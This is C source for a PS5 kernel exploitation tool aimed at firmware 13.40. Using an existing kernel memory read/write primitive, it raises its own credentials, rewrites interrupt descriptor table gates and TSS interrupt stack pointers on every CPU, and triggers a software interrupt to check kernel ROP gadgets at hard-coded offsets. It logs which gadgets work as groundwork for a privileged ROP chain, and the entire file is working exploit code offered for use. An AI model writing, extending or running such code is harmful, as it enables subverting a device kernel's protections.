/* oracle8 — final pre-flight for the 13.40 safe-set chain. Verifies the four
 * unverified-but-needed gadgets plus two cross-fw pop rsi candidates, with
 * register readback at the landing to identify WHICH register a pop hits.
 * Order: safest first; every verdict fsync'd before the next candidate.
 *  1 DBREG_RESUME 0x2529D8  ctx jump (arm path launcher)   — jump lands = PASS
 *  2 STORE_RAX_RDI 0xAC200E K_STORE mov [rdi],rax          — direction+value
 *  3 REP_MOVSB 0x25D027     K_REP  rep movsb;nop;rep ret   — first-iter trap
 *  4 REP_ALT 0x259C2A       K_REP  rep movsb;pop rbp;ret   — fallback copy
 *  5 POP_RSI_A 0x2A46ED     identity probe (13.00 map)
 *  6 POP_RSI_B 0x632731     identity probe (13.20 map)
 * TF catches a real pop after the pop, before its ret, so landing rsi
 * tells the register: DORETI_VA => X==rsi (WINNER); MAGIC_RSI => wrong reg.
 * Log: /data/oracle8_1340.log
 */
#include <fcntl.h>
#include <inttypes.h>
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include <ps5/kernel.h>

#define CAVE_RVA 0x2D29000ULL
#define GS_OFF 0x20000ULL
#define IST4_TOP (CAVE_RVA + GS_OFF + 0x1F0ULL)
#define IST6_TOP (CAVE_RVA + GS_OFF + 0x440ULL)
#define SCRATCH (CAVE_RVA + 0x800ULL)
#define NATIVE1_RVA 0x268dc0ULL
#define NATIVE179_RVA 0x268ef0ULL
#define ADD_RSP_RVA 0x257B36ULL
#define DORETI_RVA 0x257B3DULL

#define T_STORE 0x600ULL
#define T_OR 0x700ULL
#define T_REP_DST 0x710ULL
#define T_REP_SRC 0x720ULL
#define CTX_OFF 0x800ULL
#define IRET_FR 0xA00ULL

#define MAGIC_RSI 0xDEAD0001BEEF0002ULL

enum kind {
  K_POP,    /* len==1 rsp+8, landing rsi identifies register */
  K_STORE,  /* len 3 rsp 0 + mem==magic                       */
  K_REP,    /* rip==cand + 1 byte copied                      */
  K_DBREG,  /* ctx jump path, no TF                           */
};

typedef struct {
  const char *name;
  uint64_t rva;
  enum kind kind;
  uint64_t rax, rcx, rdx, rsi, rdi, r8;
  uint64_t mem_off;
  uint64_t magic;
} cand_t;

static const cand_t cands[] = {
  {"DBREG_RESUME",   0x2529D8, K_DBREG,  0, 0, 0, 0, 0, 0, 0, 0},
  {"STORE_RAX_RDI",  0xAC200E, K_STORE,  0, 0, 0, 0, 0, 0, T_STORE, 0x5152535455565758ULL},
  {"REP_MOVSB",      0x25D027, K_REP,    0, 8, 0, 0, 0, 0, T_REP_DST, 0x4142434445464748ULL},
  {"REP_ALT",        0x259C2A, K_REP,    0, 8, 0, 0, 0, 0, T_REP_DST, 0x4142434445464748ULL},
  {"POP_RSI_A",      0x2A46ED, K_POP,    0, 0, 0, 0, 0, 0, 0, 0},
  {"POP_RSI_B",      0x632731, K_POP,    0, 0, 0, 0, 0, 0, 0, 0},
};
#define NCAND (sizeof cands / sizeof cands[0])

static uint64_t g_rows[16];
static uint64_t g_save4[16], g_save6[16];
static uint8_t g_gate1[16], g_gate179[16];
volatile int g_marker;
uint64_t g_text, g_ustack, g_phase2, g_shield, g_idx;
uint64_t g_rax, g_rcx, g_rdx, g_rsi, g_rdi, g_r8;
uint64_t g_land_rsi, g_land_rdi;
static jmp_buf g_jmp;
static int g_running;

__attribute__((naked)) static void
fire(void) {
  __asm__ volatile(
      "movl $5, g_marker(%rip)\n"
      "mov g_shield(%rip), %rbx\n"
      "mov %rbx, %rbp\n"
      "mov %rbx, %r9\n mov %rbx, %r10\n mov %rbx, %r11\n"
      "mov %rbx, %r12\n mov %rbx, %r13\n mov %rbx, %r14\n mov %rbx, %r15\n"
      "mov g_rax(%rip), %rax\n"
      "mov g_rcx(%rip), %rcx\n"
      "mov g_rdx(%rip), %rdx\n"
      "mov g_rsi(%rip), %rsi\n"
      "mov g_rdi(%rip), %rdi\n"
      "mov g_r8(%rip), %r8\n"
      "movl $6, g_marker(%rip)\n"
      "int $0xB3\n"
      "ud2\n");
}

/* capture rsi/rdi from the CPL0 landing before C clobbers them */
__attribute__((naked)) static void
landing(void) {
  __asm__ volatile("mov %rsi, g_land_rsi(%rip)\n"
                   "mov %rdi, g_land_rdi(%rip)\n"
                   "mov g_phase2(%rip), %rax\n"
                   "call *%rax\n"
                   "ud2\n");
}

static void
record(const cand_t *c, const char *verdict, uint64_t len, uint64_t rsp) {
  printf("%-16s rva=%#06llx %s len=%lld rsp=%#llx rsi=%#llx rdi=%#llx\n", c->name,
         (unsigned long long)c->rva, verdict, (long long)(int64_t)len,
         (unsigned long long)rsp, (unsigned long long)g_land_rsi,
         (unsigned long long)g_land_rdi);
  fsync(STDOUT_FILENO);
}

static void
phase_db(void) {
  const cand_t *c = &cands[g_idx];
  uint64_t gs = g_text + CAVE_RVA + GS_OFF;
  uint64_t f[5];
  int ok = 0;
  const char *v = "FAIL";
  uint64_t mem = 0;

  memset(f, 0, sizeof f);
  kernel_copyout((intptr_t)(gs + 0x1c8ULL), f, sizeof f);
  int64_t len = (int64_t)f[0] - (int64_t)(g_text + c->rva);
  uint64_t rsp_delta = f[3] - (uint64_t)(g_text + SCRATCH);
  if(c->mem_off)
    kernel_copyout((intptr_t)(gs + c->mem_off), &mem, 8);

  switch(c->kind) {
  case K_POP:
    /* shape AND identity: pop loaded [SCRATCH]=DORETI_VA into X */
    ok = (len == 1 && rsp_delta == 8 && g_land_rsi == g_text + DORETI_RVA);
    break;
  case K_STORE:
    ok = (len == 3 && rsp_delta == 0 && mem == c->magic);
    break;
  case K_REP:
    ok = (len == 0 && (mem & 0xff) == 0x41);
    break;
  case K_DBREG:
    ok = 1;
    break;
  }
  if(ok)
    v = "PASS";
  printf("%-16s frame rip=%#llx rfl=%#llx rsp=%#llx mem=%#llx\n", c->name,
         (unsigned long long)f[0], (unsigned long long)f[2],
         (unsigned long long)f[3], (unsigned long long)mem);
  record(c, v, len == 0 ? 0 : (uint64_t)len, f[3]);
  if(g_idx + 1 >= NCAND)
    g_running = 0;
  longjmp(g_jmp, 1);
}

static void
crash_handler(int sig, siginfo_t *si, void *uc) {
  (void)uc;
  char buf[128];
  int n = snprintf(buf, sizeof buf, "SIGNAL %d marker %d addr=%#llx cand %s\n",
                   sig, g_marker, (unsigned long long)si->si_addr,
                   g_idx < NCAND ? cands[g_idx].name : "?");
  write(STDOUT_FILENO, buf, n);
  fsync(STDOUT_FILENO);
  _exit(99);
}

static int
readn(uint64_t a, void *b, size_t n) {
  return kernel_copyout((intptr_t)a, b, n);
}
static int
writen(uint64_t a, const void *b, size_t n) {
  return kernel_copyin(b, (intptr_t)a, n);
}
static void
mkgate(uint8_t *g, uint64_t target, uint8_t ist, uint8_t type) {
  uint16_t lo = (uint16_t)target, mid = (uint16_t)(target >> 16);
  uint32_t hi = (uint32_t)(target >> 32);
  memset(g, 0, 16);
  memcpy(g, &lo, 2);
  g[2] = 0x20;
  g[4] = ist;
  g[5] = type;
  memcpy(g + 6, &mid, 2);
  memcpy(g + 8, &hi, 4);
}
static uint64_t
gate_off(const uint8_t *g) {
  uint16_t lo = 0, mid = 0;
  uint32_t hi = 0;
  memcpy(&lo, g, 2);
  memcpy(&mid, g + 6, 2);
  memcpy(&hi, g + 8, 4);
  return ((uint64_t)hi << 32) | ((uint64_t)mid << 16) | lo;
}

int
main(void) {
  uint64_t data = (uint64_t)KERNEL_ADDRESS_DATA_BASE;
  g_text = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
  uint64_t tss = data + 0x2ee6fe0ULL;
  uint64_t idt = data + 0x2ee4300ULL;
  uint64_t gs = g_text + CAVE_RVA + GS_OFF;
  uint8_t g1[16], g179[16];
  int fd = open("/data/oracle8_1340.log", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if(fd >= 0) {
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);
    if(fd > STDERR_FILENO)
      close(fd);
  }
  setvbuf(stdout, NULL, _IONBF, 0);
  {
    struct sigaction sa;
    memset(&sa, 0, sizeof sa);
    sa.sa_sigaction = crash_handler;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGILL, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGFPE, &sa, NULL);
  }

  printf("oracle8 final preflight; fw=%#x text=%#" PRIx64 " n=%zu\n",
         kernel_get_fw_version(), g_text, NCAND);
  fsync(STDOUT_FILENO);
  if((kernel_get_fw_version() & 0xffff0000U) != 0x13400000U)
    return 1;
  kernel_set_ucred_authid(getpid(), 0x4800000000000007ULL);

  if(readn(idt + 16, g1, 16) || readn(idt + 179 * 16, g179, 16) ||
     gate_off(g1) != g_text + NATIVE1_RVA || g1[5] != 0x8e ||
     gate_off(g179) != g_text + NATIVE179_RVA || g179[4] != 0 ||
     g179[5] != 0x8e) {
    printf("ABORT gates not native\n");
    return 3;
  }
  memcpy(g_gate1, g1, 16);
  memcpy(g_gate179, g179, 16);

  {
    uint8_t *shield = mmap(NULL, 0x100000, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if(shield == MAP_FAILED) {
      printf("shield mmap fail\n");
      return 4;
    }
    memset(shield, 0, 0x100000);
    g_shield = (uint64_t)(uintptr_t)shield + 0x80000;
  }

  {
    uint64_t zeros[16];
    if(readn(gs + 0x800, zeros, sizeof zeros)) {
      printf("cave read fail\n");
      return 4;
    }
    for(size_t i = 0; i < 16; i++)
      if(zeros[i]) {
        printf("ABORT cave not zero\n");
        return 4;
      }
  }

  uint8_t *ust = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if(ust == MAP_FAILED) {
    printf("ustack mmap fail\n");
    return 5;
  }
  memset(ust, 0, 0x2000);
  g_ustack = (uint64_t)(uintptr_t)ust + 0x1800;
  g_phase2 = (uint64_t)(uintptr_t)&phase_db;

  for(int cpu = 0; cpu < 16; cpu++) {
    g_rows[cpu] = tss + (uint64_t)cpu * 0x68ULL;
    if(readn(g_rows[cpu] + 0x3c, &g_save4[cpu], 8) ||
       readn(g_rows[cpu] + 0x4c, &g_save6[cpu], 8)) {
      printf("tss read fail cpu=%d\n", cpu);
      return 6;
    }
    if(writen(g_rows[cpu] + 0x3c, &(uint64_t){g_text + IST4_TOP}, 8) ||
       writen(g_rows[cpu] + 0x4c, &(uint64_t){g_text + IST6_TOP}, 8)) {
      printf("tss arm fail cpu=%d\n", cpu);
      return 6;
    }
  }

  {
    uint64_t catchf[5] = {(uint64_t)(uintptr_t)&landing, 0x43, 0x202,
                          g_ustack, 0x3b};
    uint64_t scratch[8] = {0};
    scratch[0] = g_text + DORETI_RVA; /* pops load this: DORETI == rsi win */
    uint64_t rep_src = 0x4142434445464748ULL;
    uint64_t ctx[64];
    uint64_t iretfr[5] = {(uint64_t)(uintptr_t)&landing, 0x43, 0x202,
                          g_ustack, 0x3b};
    for(size_t i = 0; i < 64; i++)
      ctx[i] = 0x202;
    ctx[(0x28 - 0) / 8] = gs + IRET_FR;
    ctx[(0x38 - 0) / 8] = g_text + DORETI_RVA;
    ctx[(0xa0 - 0) / 8] = 0;
    if(writen(gs + 0x2b0, catchf, sizeof catchf) ||
       writen(g_text + SCRATCH, scratch, sizeof scratch) ||
       writen(gs + T_REP_SRC, &rep_src, 8) ||
       writen(gs + CTX_OFF, ctx, sizeof ctx) ||
       writen(gs + IRET_FR, iretfr, sizeof iretfr)) {
      printf("plant fail\n");
      return 7;
    }
  }

  mkgate(g1, g_text + ADD_RSP_RVA, 4, 0x8e);
  mkgate(g179, g_text + ADD_RSP_RVA, 6, 0xee);
  if(writen(idt + 16, g1, 16) || writen(idt + 179 * 16, g179, 16)) {
    printf("gate arm fail\n");
    return 8;
  }
  printf("gates armed; batch begin\n");
  fsync(STDOUT_FILENO);

  g_running = 1;
  for(g_idx = 0; g_idx < NCAND && g_running; g_idx++) {
    const cand_t *c = &cands[g_idx];
    uint64_t candf[5];
    uint64_t z8 = 0;

    for(uint64_t t = T_STORE; t < T_STORE + 0x148; t += 8)
      writen(gs + t, &z8, 8);
    if(c->kind == K_REP)
      writen(gs + T_REP_SRC, &(uint64_t){0x4142434445464748ULL}, 8);
    if(c->kind == K_STORE)
      writen(gs + c->mem_off, &z8, 8);

    candf[0] = g_text + c->rva;
    candf[1] = 0x20;
    candf[2] = (c->kind == K_DBREG) ? 0x202 : 0x102;
    candf[3] = g_text + SCRATCH;
    candf[4] = 0x28;
    g_rax = c->rax ? c->rax : g_shield;
    g_rcx = g_shield;
    g_rdx = g_shield;
    g_rsi = g_shield;
    g_rdi = g_shield;
    g_r8 = g_shield;
    if(c->kind == K_STORE) {          /* mov [rdi], rax */
      g_rdi = gs + c->mem_off;
      g_rax = c->magic;
    } else if(c->kind == K_REP) {
      g_rcx = 8;
      g_rdi = gs + T_REP_DST;
      g_rsi = gs + T_REP_SRC;
    } else if(c->kind == K_POP) {     /* identity probe */
      g_rsi = MAGIC_RSI;
    } else if(c->kind == K_DBREG) {
      g_rdi = gs + CTX_OFF;
    }

    if(writen(gs + 0x500, candf, sizeof candf)) {
      printf("candf plant fail %s\n", c->name);
      break;
    }
    printf("-- firing %-16s\n", c->name);
    fsync(STDOUT_FILENO);
    g_marker = 0;
    g_land_rsi = 0;
    g_land_rdi = 0;
    if(setjmp(g_jmp) == 0)
      fire();
  }

  if(kernel_copyin(g_gate1, (intptr_t)(idt + 16), 16) ||
     kernel_copyin(g_gate179, (intptr_t)(idt + 179 * 16), 16))
    printf("disarm fail\n");
  for(int cpu = 0; cpu < 16; cpu++) {
    kernel_copyin(&g_save4[cpu], (intptr_t)(g_rows[cpu] + 0x3c), 8);
    kernel_copyin(&g_save6[cpu], (intptr_t)(g_rows[cpu] + 0x4c), 8);
  }
  printf("BATCH_DONE disarmed\n");
  fsync(STDOUT_FILENO);
  return 0;
}
